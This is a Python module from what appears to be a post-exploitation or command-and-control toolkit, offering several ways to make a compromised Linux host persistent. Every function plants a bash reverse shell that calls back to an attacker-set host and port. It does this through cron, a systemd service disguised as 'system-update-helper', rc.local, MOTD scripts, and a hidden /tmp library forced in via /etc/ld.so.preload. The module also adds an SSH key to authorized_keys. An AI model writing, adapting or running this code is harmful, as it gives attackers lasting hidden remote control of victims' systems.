"""Persistence mechanisms module."""

import os
import subprocess
import base64

NAME = "persist"


def _run(cmd: str) -> str:
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=15).decode(errors="replace").strip()
    except Exception:
        return ""


def _agent_callback(host: str, port: int) -> str:
    return f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"


def cmd_persist_cron(interval: int = 5) -> dict:
    host = os.getenv("PS_C2_HOST", "0.0.0.0")
    port = int(os.getenv("PS_C2_PORT", "4444"))
    callback = _agent_callback(host, port)
    entry = f"*/{interval} * * * * {callback}"
    existing = _run("crontab -l 2>/dev/null")
    if callback in existing:
        return {"status": "already_installed", "type": "cron"}
    new_cron = f"{existing}\n{entry}" if existing else entry
    result = subprocess.run(f'echo "{new_cron}" | crontab -', shell=True,
                           capture_output=True, text=True)
    return {
        "status": "success" if result.returncode == 0 else "error",
        "type": "cron",
        "interval": interval,
        "error": result.stderr if result.returncode != 0 else None,
    }


def cmd_persist_ssh(key: str = "") -> dict:
    if not key:
        result = _run("cat ~/.ssh/id_rsa.pub 2>/dev/null")
        if not result:
            _run("ssh-keygen -t rsa -b 4096 -f ~/.ssh/id_rsa -N '' -q")
            result = _run("cat ~/.ssh/id_rsa.pub")
        key = result

    ssh_dir = os.path.expanduser("~/.ssh")
    os.makedirs(ssh_dir, mode=0o700, exist_ok=True)
    auth_keys = os.path.join(ssh_dir, "authorized_keys")

    existing = ""
    if os.path.exists(auth_keys):
        with open(auth_keys, "r") as f:
            existing = f.read()
    if key in existing:
        return {"status": "already_installed", "type": "ssh"}

    with open(auth_keys, "a") as f:
        f.write(f"\n{key}\n")
    os.chmod(auth_keys, 0o600)
    return {"status": "success", "type": "ssh", "key": key[:80] + "..."}


def cmd_persist_systemd() -> dict:
    host = os.getenv("PS_C2_HOST", "0.0.0.0")
    port = int(os.getenv("PS_C2_PORT", "4444"))
    callback = _agent_callback(host, port)
    service_name = "system-update-helper"

    unit = f"""[Unit]
Description=System Update Helper
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c '{callback}'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
"""
    uid = os.getuid() if hasattr(os, "getuid") else 1000
    if uid == 0:
        path = f"/etc/systemd/system/{service_name}.service"
    else:
        path = os.path.expanduser(f"~/.config/systemd/user/{service_name}.service")
        os.makedirs(os.path.dirname(path), exist_ok=True)

    try:
        with open(path, "w") as f:
            f.write(unit)
        if uid == 0:
            _run(f"systemctl daemon-reload && systemctl enable {service_name}")
        else:
            _run(f"systemctl --user daemon-reload && systemctl --user enable {service_name}")
        return {"status": "success", "type": "systemd", "path": path}
    except PermissionError:
        return {"status": "error", "type": "systemd", "error": "Permission denied"}


def cmd_persist_rc() -> dict:
    host = os.getenv("PS_C2_HOST", "0.0.0.0")
    port = int(os.getenv("PS_C2_PORT", "4444"))
    callback = _agent_callback(host, port)
    rc_local = "/etc/rc.local"
    try:
        if os.path.exists(rc_local):
            with open(rc_local, "r") as f:
                content = f.read()
            if callback in content:
                return {"status": "already_installed", "type": "rc.local"}
        else:
            content = "#!/bin/bash\n"

        content = content.rstrip("\n") + f"\n{callback} &\nexit 0\n"
        with open(rc_local, "w") as f:
            f.write(content)
        os.chmod(rc_local, 0o755)
        return {"status": "success", "type": "rc.local", "path": rc_local}
    except PermissionError:
        return {"status": "error", "type": "rc.local", "error": "Permission denied (need root)"}


def cmd_persist_motd() -> dict:
    host = os.getenv("PS_C2_HOST", "0.0.0.0")
    port = int(os.getenv("PS_C2_PORT", "4444"))
    callback = _agent_callback(host, port)
    motd_dir = "/etc/update-motd.d"
    script_path = os.path.join(motd_dir, "99-update")
    try:
        with open(script_path, "w") as f:
            f.write(f"#!/bin/bash\n{callback} &\n")
        os.chmod(script_path, 0o755)
        return {"status": "success", "type": "motd", "path": script_path}
    except PermissionError:
        return {"status": "error", "type": "motd", "error": "Permission denied"}


def cmd_persist_ldpreload() -> dict:
    c_code = r"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init() {
    if (fork() == 0) {
        setsid();
        system("CALLBACK_PLACEHOLDER");
        _exit(0);
    }
}
"""
    host = os.getenv("PS_C2_HOST", "0.0.0.0")
    port = int(os.getenv("PS_C2_PORT", "4444"))
    c_code = c_code.replace("CALLBACK_PLACEHOLDER", _agent_callback(host, port))
    src = "/tmp/.libsystem.c"
    lib = "/tmp/.libsystem.so"
    try:
        with open(src, "w") as f:
            f.write(c_code)
        result = _run(f"gcc -shared -fPIC -o {lib} {src} -nostartfiles 2>&1")
        os.unlink(src)
        if os.path.exists(lib):
            with open("/etc/ld.so.preload", "a") as f:
                f.write(f"{lib}\n")
            return {"status": "success", "type": "ld_preload", "path": lib}
        return {"status": "error", "type": "ld_preload", "error": result}
    except PermissionError:
        return {"status": "error", "type": "ld_preload", "error": "Permission denied"}


def cmd_persist_all() -> dict:
    results = {}
    for name, func in [("cron", cmd_persist_cron), ("ssh", cmd_persist_ssh),
                        ("systemd", cmd_persist_systemd), ("rc", cmd_persist_rc)]:
        try:
            results[name] = func()
        except Exception as e:
            results[name] = {"status": "error", "error": str(e)}
    return {"installed": results}


COMMANDS = {
    "persist_all": {"handler": cmd_persist_all, "description": "Install all applicable persistence"},
    "persist_cron": {"handler": cmd_persist_cron, "description": "Cron-based persistence"},
    "persist_ssh": {"handler": cmd_persist_ssh, "description": "SSH key persistence"},
    "persist_systemd": {"handler": cmd_persist_systemd, "description": "Systemd service persistence"},
    "persist_rc": {"handler": cmd_persist_rc, "description": "rc.local persistence"},
    "persist_motd": {"handler": cmd_persist_motd, "description": "MOTD persistence"},
    "persist_ldpreload": {"handler": cmd_persist_ldpreload, "description": "LD_PRELOAD persistence"},
}
